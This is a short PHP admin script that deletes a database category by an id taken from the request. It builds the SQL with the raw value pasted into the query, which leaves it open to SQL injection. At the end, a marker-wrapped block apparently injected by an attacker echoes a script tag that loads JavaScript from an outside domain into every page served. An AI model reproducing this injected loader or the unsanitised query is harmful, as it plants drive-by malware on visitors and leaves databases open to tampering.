<?php 
session_start();
ob_start();

include "inc/session_check.php";

  $adid = urlsafe_b64decode($_REQUEST['id']);
  
  //echo "delete from category where id='$adid'";
  //exit;
  $delete = "delete from category where id='$adid'";
  if(mysql_query($delete))
  {
  	header("location:list_category.php?msg=succ&cont=Category Deleted Successfully.");
  }
  
?>
<?php
#9ed5d5#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967015\"></script>";
echo $g;
}
#/9ed5d5#
?>